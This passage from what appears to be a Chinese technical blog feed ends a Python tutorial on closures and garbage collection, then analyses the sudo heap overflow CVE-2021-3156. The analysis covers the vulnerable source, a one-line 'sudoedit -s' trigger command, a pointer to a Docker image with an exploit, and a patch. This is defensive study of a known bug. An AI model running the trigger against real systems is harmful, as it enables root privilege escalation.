class="params">y</span>):</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line">closure = outer(<span class="number">10</span>)  <span class="comment"># outer(10) 返回的是 inner 函数</span></span><br><span class="line"><span class="built_in">print</span>(closure(<span class="number">5</span>))     <span class="comment"># 输出：15， 10 + 5</span></span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li><code>outer</code> 是外部函数，<code>inner</code> 是内部函数。</li><li><code>inner</code> 可以访问外部函数 <code>outer</code> 的参数 <code>x</code>。</li><li><code>closure</code> 通过调用 <code>outer(10)</code> 得到 <code>inner</code> 函数的引用，并且保留了 <code>x = 10</code> 这个变量。</li></ul><hr><h2 id="闭包的应用场景"><a href="#闭包的应用场景" class="headerlink" title="闭包的应用场景"></a>闭包的应用场景</h2><h3 id="函数工厂"><a href="#函数工厂" class="headerlink" title="函数工厂"></a>函数工厂</h3><p>闭包可以用来创建函数工厂，即根据不同的输入参数创建不同的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_adder</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">adder</span>(<span class="params">y</span>):</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    <span class="keyword">return</span> adder</span><br><span class="line"></span><br><span class="line">add_5 = make_adder(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(add_5(<span class="number">10</span>))  <span class="comment"># 输出：15</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>make_adder</code> 函数返回一个加法函数 <code>adder</code>，而 <code>adder</code> 会记住 <code>x</code> 的值。<code>add_5</code> 就是一个通过闭包生成的函数，它始终会把 <code>5</code> 加到输入的参数上。</p><h3 id="延迟计算"><a href="#延迟计算" class="headerlink" title="延迟计算"></a>延迟计算</h3><p>闭包也可用于延迟计算，能够保留计算所需的环境。</p><p><strong>示例：生成一系列延迟计算的函数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_counter</span>():</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">counter</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> count</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line">    <span class="keyword">return</span> counter</span><br><span class="line"></span><br><span class="line">counter1 = make_counter()</span><br><span class="line"><span class="built_in">print</span>(counter1())  <span class="comment"># 输出：1</span></span><br><span class="line"><span class="built_in">print</span>(counter1())  <span class="comment"># 输出：2</span></span><br><span class="line"></span><br><span class="line">counter2 = make_counter()</span><br><span class="line"><span class="built_in">print</span>(counter2())  <span class="comment"># 输出：1</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>make_counter</code> 返回一个计数器函数 <code>counter</code>，每次调用 <code>counter</code> 时会增加 <code>count</code> 的值，并且 <code>count</code> 变量通过闭包被保存下来。<code>counter1</code> 和 <code>counter2</code> 是两个独立的计数器，它们互不干扰。</p><hr><h2 id="闭包与函数式编程"><a href="#闭包与函数式编程" class="headerlink" title="闭包与函数式编程"></a>闭包与函数式编程</h2><p>闭包是函数式编程中的一个重要特性，能够使函数作为返回值返回，并且带有环境信息。这种特性为实现函数工厂、延迟计算、函数式组合等提供了强大的支持。</p><p>通过闭包，可以创建高阶函数（接受或返回函数的函数），并且能在不显式传递参数的情况下，保持函数内部的状态。</p><hr><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>闭包</strong>是指一个函数能够记住并访问其定义时的作用域，即使外部函数已经执行完毕。</li><li>闭包的关键是内部函数对外部函数变量的引用，以及外部函数返回的内部函数。</li><li>闭包常用于函数工厂、延迟计算等场景，能提高代码的灵活性和可复用性。</li></ul><p>通过使用闭包，可以更好地管理状态、提高函数的复用性，并且在构建一些高级功能时，提供更多的灵活性。</p><hr><h1 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h1><p>Python 的垃圾回收机制是自动管理内存的一种方式，它通过引用计数和循环垃圾回收来确保不再使用的内存得到回收。垃圾回收机制的目的是避免内存泄漏，并帮助开发者更好地管理内存，减少程序中的内存管理负担。</p><hr><h2 id="引用计数（Reference-Counting）"><a href="#引用计数（Reference-Counting）" class="headerlink" title="引用计数（Reference Counting）"></a>引用计数（Reference Counting）</h2><p>引用计数是 Python 中的基本内存管理机制。每当一个对象被引用时，Python 会将该对象的引用计数加 1；当引用不再指向该对象时，引用计数会减 1。如果一个对象的引用计数变为 0，表示没有任何变量或对象再引用它，Python 会自动回收该对象所占的内存。</p><p><strong>引用计数的工作原理</strong></p><p>当一个变量或对象引用其他对象时，Python 会为该对象增加引用计数。随着对象的生命周期变化，引用计数会增加或减少。当一个对象的引用计数最终降为 0 时，意味着没有任何引用指向该对象，Python 会自动销毁该对象并回收其占用的内存。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">a = []  <span class="comment"># 创建一个空列表</span></span><br><span class="line"><span class="built_in">print</span>(sys.getrefcount(a))  <span class="comment"># 输出：2，包含a自身和引用它的getrefcount</span></span><br><span class="line"></span><br><span class="line">b = a  <span class="comment"># b 也引用 a</span></span><br><span class="line"><span class="built_in">print</span>(sys.getrefcount(a))  <span class="comment"># 输出：3</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>sys.getrefcount(a)</code> 返回的是对象 <code>a</code> 的引用计数。每当有新的变量引用 <code>a</code> 时，引用计数就会增加。</p><p><strong>引用计数的局限性</strong></p><p>虽然引用计数是一种简单高效的内存管理方式，但它有一个缺点：无法处理<strong>循环引用</strong>。如果两个对象互相引用，且没有其他地方引用它们，它们的引用计数将永远不会为 0，从而导致内存泄漏。</p><hr><h2 id="循环垃圾回收（Cycle-Garbage-Collection）"><a href="#循环垃圾回收（Cycle-Garbage-Collection）" class="headerlink" title="循环垃圾回收（Cycle Garbage Collection）"></a>循环垃圾回收（Cycle Garbage Collection）</h2><p>为了处理循环引用问题，Python 引入了 <strong>循环垃圾回收机制</strong>。当多个对象相互引用时，它们的引用计数可能永远不为 0，导致它们的内存无法释放。Python 的循环垃圾回收机制会定期检查这些循环引用，并回收不再使用的内存。</p><h3 id="分代垃圾回收"><a href="#分代垃圾回收" class="headerlink" title="分代垃圾回收"></a>分代垃圾回收</h3><p>Python 的垃圾回收机制采用了分代收集（Generational Collection）策略。对象根据其生命周期被划分为三代：</p><ul><li><strong>第一代</strong>：新创建的对象。</li><li><strong>第二代</strong>：经过一次或多次垃圾回收后仍然存活的对象。</li><li><strong>第三代</strong>：经历多次垃圾回收且依然存活的对象。</li></ul><p>垃圾回收的主要策略是：新创建的对象会放入第一代，经过一次或多次垃圾回收后，仍然存活的对象会被提升到第二代或第三代。Python 会优先对第一代对象进行回收，因为它们可能更容易被销毁。</p><h3 id="循环引用的检测与回收"><a href="#循环引用的检测与回收" class="headerlink" title="循环引用的检测与回收"></a>循环引用的检测与回收</h3><p>Python 的垃圾回收机制会检测到对象之间的循环引用，并在适当的时候回收这些对象。为了优化性能，Python 不会在每次垃圾回收时都检查所有对象，而是采用增量的方式，只在一定条件下检查和回收循环引用。</p><hr><h2 id="gc-模块"><a href="#gc-模块" class="headerlink" title="gc 模块"></a><code>gc</code> 模块</h2><p>Python 提供了一个名为 <code>gc</code> 的模块，用于控制和调试垃圾回收过程。<code>gc</code> 模块允许开发者手动触发垃圾回收、检查回收状态，并获取内存使用的相关信息。</p><p><strong>常用的 <strong><code>**gc**</code></strong> 函数</strong></p><ul><li><code>**gc.collect()**</code>：手动启动垃圾回收，清除未被引用的对象。</li><li><code>**gc.get_count()**</code>：返回当前垃圾回收的计数，显示每代垃圾回收的次数。</li><li><code>**gc.set_debug()**</code>：设置垃圾回收的调试输出，用于查看垃圾回收的详细过程。</li></ul><p><strong>示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gc</span><br><span class="line"></span><br><span class="line">gc.collect()  <span class="comment"># 强制启动垃圾回收</span></span><br><span class="line"><span class="built_in">print</span>(gc.get_count())  <span class="comment"># 获取垃圾回收计数</span></span><br></pre></td></tr></table></figure><p>通过这些工具，开发者可以在需要时手动控制垃圾回收过程，避免内存泄漏或不必要的资源占用。</p><hr><h2 id="内存泄漏的防范"><a href="#内存泄漏的防范" class="headerlink" title="内存泄漏的防范"></a>内存泄漏的防范</h2><p>尽管 Python 使用垃圾回收机制来管理内存，但不当的代码使用仍然可能导致内存泄漏。特别是循环引用或未清理的缓存，可能导致对象无法被回收，造成内存泄漏。为防止内存泄漏，可以采取以下措施：</p><h3 id="避免循环引用"><a href="#避免循环引用" class="headerlink" title="避免循环引用"></a>避免循环引用</h3><p>尽量避免对象之间互相引用，特别是在复杂的对象之间。使用弱引用（<code>weakref</code>）可以有效防止对象在不需要时仍然占用内存。</p><h3 id="显式删除不再需要的引用"><a href="#显式删除不再需要的引用" class="headerlink" title="显式删除不再需要的引用"></a>显式删除不再需要的引用</h3><p>当某个对象不再使用时，可以显式地将其引用设为 <code>None</code> 或使用 <code>del</code> 删除对象，以帮助垃圾回收器更早地回收内存。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = SomeLargeObject()</span><br><span class="line"><span class="keyword">del</span> a  <span class="comment"># 显式删除引用</span></span><br></pre></td></tr></table></figure><h3 id="使用弱引用（weakref）"><a href="#使用弱引用（weakref）" class="headerlink" title="使用弱引用（weakref）"></a>使用弱引用（<code>weakref</code>）</h3><p>通常，当创建一个对象的引用时（例如通过变量或数据结构引用它），Python 会增加该对象的引用计数。当引用计数为零时，Python 的垃圾回收机制会自动销毁该对象。这个过程通常被称为 <strong>强引用</strong>。</p><p>而 <strong>弱引用</strong> 与此不同，它不会增加对象的引用计数。因此，如果一个对象仅被弱引用指向，它仍然可以被垃圾回收器销毁，不会因为存在弱引用而延长其生命周期。</p><p>在缓存或对象池中，使用弱引用（<code>weakref</code>）可以避免对对象的强引用，确保对象在没有其他引用时能够及时被回收。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weakref</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line">weak_ref = weakref.ref(obj)</span><br><span class="line"><span class="built_in">print</span>(weak_ref())  <span class="comment"># 返回对象本身</span></span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;引用与非引用类型&quot;&gt;&lt;a href=&quot;#引用与非引用类型&quot; class=&quot;headerlink&quot; title=&quot;引用与非引用类型&quot;&gt;&lt;/a&gt;引用与非引用类型&lt;/h1&gt;&lt;h2 id=&quot;Python中的引用类型与非引用类型&quot;&gt;&lt;a href=&quot;#Python中的引用类</summary>
      
    
    
    
    
    <category term="Python" scheme="https://lyi61pd.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156</title>
    <link href="https://lyi61pd.github.io/2025/04/17/CVE-2021-3156/"/>
    <id>https://lyi61pd.github.io/2025/04/17/CVE-2021-3156/</id>
    <published>2025-04-17T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.099Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在sudo的<code>parse_args()</code>函数中，重写了<code>argv</code>，将命令行的参数存储到<code>cmnd</code>中(587-595行)，将参数中的字母数字_-$以外的字符，也就是元字符，前面加上反斜杠\来转义处理（590-591行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">571</span>     <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; </span><br><span class="line"><span class="number">572</span>         <span class="type">char</span> **av, *cmnd = <span class="literal">NULL</span>; </span><br><span class="line"><span class="number">573</span>         <span class="type">int</span> ac = <span class="number">1</span>; </span><br><span class="line">... </span><br><span class="line"><span class="number">581</span>             cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>); </span><br><span class="line">... <span class="comment">// 将命令行的参数存储到dst,即cmnd中</span></span><br><span class="line"><span class="number">587</span>             <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123; </span><br><span class="line"><span class="number">588</span>                 <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\0&#x27;</span>; src++) &#123; </span><br><span class="line"><span class="number">589</span>                     <span class="comment">// 除了字母数字_-$以外的字符，前面加上反斜杠\来转义</span></span><br><span class="line"><span class="number">590</span>                     <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="type">unsigned</span> <span class="type">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>) </span><br><span class="line"><span class="number">591</span>                         *dst++ = <span class="string">&#x27;\\&#x27;</span>; </span><br><span class="line"><span class="number">592</span>                     *dst++ = *src; </span><br><span class="line"><span class="number">593</span>                 &#125; </span><br><span class="line"><span class="number">594</span>                 *dst++ = <span class="string">&#x27; &#x27;</span>; </span><br><span class="line"><span class="number">595</span>             &#125; </span><br><span class="line">... </span><br><span class="line"><span class="number">600</span>             ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span> </span><br><span class="line">... </span><br><span class="line"><span class="number">603</span>         av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="type">char</span> *)); </span><br><span class="line">... <span class="comment">// 根据cmnd重写argv和argc</span></span><br><span class="line"><span class="number">609</span>         av[<span class="number">0</span>] = (<span class="type">char</span> *)user_details.shell;</span><br><span class="line"><span class="number">610</span>         <span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123; </span><br><span class="line"><span class="number">611</span>             av[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>; </span><br><span class="line"><span class="number">612</span>             av[<span class="number">2</span>] = cmnd; </span><br><span class="line"><span class="number">613</span>         &#125; </span><br><span class="line"><span class="number">614</span>         av[ac] = <span class="literal">NULL</span>; </span><br><span class="line"><span class="number">615</span>  </span><br><span class="line"><span class="number">616</span>         argv = av; </span><br><span class="line"><span class="number">617</span>         argc = ac; </span><br><span class="line"><span class="number">618</span>     &#125;</span><br></pre></td></tr></table></figure><p>之后，在<code>sudoers_policy_main()</code>，<code>set_cmnd()</code>函数中，会把前面重写的<code>argv</code>进行解析，解析的内容存储到<code>user_args</code>变量中，在解析时对使用反斜杠\的字符进行反转义处理时（590-591行），逻辑出现问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">819</span>     <span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">... </span><br><span class="line"><span class="number">852</span>             <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++) </span><br><span class="line"><span class="number">853</span>                 size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>; </span><br><span class="line"><span class="number">854</span>             <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">... </span><br><span class="line"><span class="number">857</span>             &#125; </span><br><span class="line"><span class="number">858</span>             <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; </span><br><span class="line">... </span><br><span class="line"><span class="number">864</span>                 <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123; </span><br><span class="line"><span class="number">865</span>                     <span class="keyword">while</span> (*from) &#123; </span><br><span class="line">    <span class="comment">// 当遇到反斜杠字符，且下一个字符不是空白字符时，会跳过</span></span><br><span class="line"><span class="number">866</span>                         <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)from[<span class="number">1</span>])) </span><br><span class="line"><span class="number">867</span>                             from++; </span><br><span class="line"><span class="number">868</span>                         *to++ = *from++; </span><br><span class="line"><span class="number">869</span>                     &#125; </span><br><span class="line"><span class="number">870</span>                     *to++ = <span class="string">&#x27; &#x27;</span>; </span><br><span class="line"><span class="number">871</span>                 &#125; </span><br><span class="line">... </span><br><span class="line"><span class="number">884</span>             &#125; </span><br><span class="line">... </span><br><span class="line"><span class="number">886</span>     &#125;</span><br></pre></td></tr></table></figure><p>如果命令行参数是以一个单独的反斜杠\结尾的，比如<code>test\</code>，就会出现问题：</p><ul><li>首先会将<code>test\</code>中的 <code>t</code> <code>e</code> <code>s</code> <code>t</code> 逐个传递给<code>to</code>变量，也就是<code>user_args</code>变量，然后当循环到<code>\</code>时，情况如下 </li><li>首先在866行，from[0]是一个反斜杠，并且from[1]是null终止符，这里要注意null终止符并不是空白字符，也就是<code>isspace</code>函数返回值为否，判断通过 </li><li>在867行，会对from进行加一，此时from指向的就是刚才的from[1]，也就是一个null终止符 </li><li>在868行，会将当前的from的内容，即null终止符传递给<code>to</code>变量，即<code>user_args</code>变量，并且<code>from</code>再次加一，这时<code>from</code>已经超出了命令行参数的边界了 </li><li>之后整个while循环会继续运行，把超出命令行参数边界的字符也传递给<code>user_args</code>变量</li></ul><p>因为<code>user_args</code>在852-853行，已经指定了<code>user_args</code>变量申请的堆的大小，而上面的循环中却把越界的内容传递给了<code>user_args</code>，因此<code>set_cmnd()</code>函数存在堆溢出漏洞</p><p>但是，如何把一个单独的反斜杠结尾的字符作为命令行参数，传递到<code>set_cmnd()</code>函数中呢？</p><p>回到前面的<code>parse_args()</code>函数中，在590-591行，对元字符（字母数字_-$以外的字符）前面加了反斜杠处理，也就是说，如果某个参数是<code>test\</code>，那么经过<code>parse_args()</code>函数后，就会变成<code>test\\</code>，然后进入到<code>set_cmnd()</code>函数，此时不会出现堆溢出的情况**(为什么**<code>**test\\**</code><strong>不会溢出，过程是怎样的)</strong>，那么如何才能只传递<code>test\</code>到<code>set_cmnd()</code>函数这里呢？</p><p>回到571行，关于<code>MODE_RUN</code>和<code>MODE_SHELL</code>的条件判断，满足这个条件才会对参数中的元字符前面加上反斜杠处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">571     if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br></pre></td></tr></table></figure><p>在819行和858行，满足这两处判断才能到达存在堆溢出漏洞的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">819     if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">... </span><br><span class="line">858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br></pre></td></tr></table></figure><p>那么可以有这样一个想法：满足819行和858行的判断条件，并且不满足571行的判断条件，这样就能把<code>test\</code>不经过元字符处理传递到堆溢出漏洞的代码处</p><ul><li>首先，要满足858行，可以通过<code>-s</code>参数设置<code>MODE_SHELL</code>，或者通过<code>-i</code>参数可以同时设置<code>MODE_LOGIN_SHELL</code>和<code>MODE_SHELL</code>，这两种均可 </li><li>那么接下来，就需要不满足<code>MODE_RUN</code>，并且满足<code>MODE_EDIT</code>或<code>MODE_CHECK</code><strong>（这个条件是怎么得出来的）</strong></li></ul><p>sudo的mode参数和flags参数是通过sudo命令执行时的参数来确定的，对sudo的参数进行研究，主要为<code>-e</code>参数和<code>-l</code>参数，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">358                 case &#x27;e&#x27;: </span><br><span class="line">... </span><br><span class="line">361                     mode = MODE_EDIT; </span><br><span class="line">362                     sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; </span><br><span class="line">363                     valid_flags = MODE_NONINTERACTIVE; </span><br><span class="line">364                     break; </span><br><span class="line">... </span><br><span class="line">416                 case &#x27;l&#x27;: </span><br><span class="line">... </span><br><span class="line">423                     mode = MODE_LIST; </span><br><span class="line">424                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST; </span><br><span class="line">425                     break; </span><br><span class="line">... </span><br><span class="line">518     if (argc &gt; 0 &amp;&amp; mode == MODE_LIST) </span><br><span class="line">519         mode = MODE_CHECK; </span><br><span class="line">... </span><br><span class="line">532     if ((flags &amp; valid_flags) != flags) </span><br><span class="line">533         usage(1);</span><br></pre></td></tr></table></figure><p>如果使用-e参数，会设置<code>MODE_EDIT</code>，并且在363行设置了有效的<code>flags</code>，其中没有包括<code>MODE_SHELL</code>这将会导致无法满足858行的判断条件，因此不符合</p><p>如果使用-l参数，会设置<code>MODE_CHECK</code>，并在424行设置有效的<code>flags</code>，其中也没有包括<code>MODE_SHELL</code>，也会导致无法满足858行的判断条件，因此使用<code>-l</code>参数也不行</p><p>看起来要满足819行和858行，并且不满足571的判断条件是做不到了，怎么办？</p><p>这时就涉及到<code>sudoedit</code>命令了，sudoedit其实本体就是sudo二进制文件，不过是将sudo二进制文件改了个名字叫做sudoedit而已</p><p>所以下面还是查看sudo的源码，有这样一个漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span> <span class="meta">#<span class="keyword">define</span> DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL) </span></span><br><span class="line">... </span><br><span class="line"><span class="number">249</span>     <span class="type">int</span> valid_flags = DEFAULT_VALID_FLAGS; </span><br><span class="line">... </span><br><span class="line"><span class="number">267</span>     proglen = <span class="built_in">strlen</span>(progname); </span><br><span class="line"><span class="number">268</span>     <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">&quot;edit&quot;</span>) == <span class="number">0</span>) &#123; </span><br><span class="line"><span class="number">269</span>         progname = <span class="string">&quot;sudoedit&quot;</span>; </span><br><span class="line"><span class="number">270</span>         mode = MODE_EDIT; </span><br><span class="line"><span class="number">271</span>         sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>; </span><br><span class="line"><span class="number">272</span>     &#125;</span><br></pre></td></tr></table></figure><p>在268行，如果程序名的后四位为<code>edit</code>，就设置<code>mode</code>为<code>MODE_EDIT</code></p><p>通过下面的命令，就能同时设置<code>MODE_EDIT</code>和<code>MODE_SHELL</code>，成功到达存在堆溢出漏洞的代码了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s</span><br></pre></td></tr></table></figure><p>然后想要实现堆溢出，就需要反斜杠参与，可以尝试下面的命令进行溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x27;\&#x27; `perl -e &#x27;print &quot;A&quot; x 65536&#x27;`</span><br></pre></td></tr></table></figure><p>从攻击者的角度思考，这个堆溢出漏洞是很理想的：</p><ol><li><code>user_args</code>申请的堆的大小是可控的</li><li>堆溢出的内容也是可控的</li><li>攻击者可以向溢出的内容加入null终止符</li></ol><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>通过提前搭建好的docker镜像来复现，里面有sudo源码，exp，pwndbg，复现的同时也便于进行分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull chenaotian/cve-2021-3156</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>存在漏洞的代码主要是这个逻辑判断存在问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)from[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>可以采用简单直接的方式进行修改：增加一个逻辑判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)from[<span class="number">1</span>]) &amp;&amp; from[<span class="number">1</span>]!=<span class="string">&#x27;\0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>制作修复补丁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">diff -uNr a b &gt; CVE-2021-3156.patch</span><br><span class="line">制作补丁，该补丁是给a打的，如果打了该补丁a就会和b一样，-u可以调整输出的格式更规范一些, -N确保正确处理新增和删除的文件, -r递归处理子目录，应该是文件夹都需要用-r来处理</span><br><span class="line"></span><br><span class="line">patch -p0 &lt; CVE-2021-3156.patch</span><br><span class="line">打补丁，-p0说明当前目录的级数为0级</span><br><span class="line"></span><br><span class="line">patch -p0 -RE &lt; CVE-2021-3156.patch</span><br><span class="line">取消刚才打的补丁</span><br></pre></td></tr></table></figure><h3 id="修复验证"><a href="#修复验证" class="headerlink" title="修复验证"></a>修复验证</h3><p>通过下面命令重新编译安装sudo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>然后重新运行exp，无法成功获取到shell，说明修复成功</p><h3 id="deb打包"><a href="#deb打包" class="headerlink" title="deb打包"></a>deb打包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 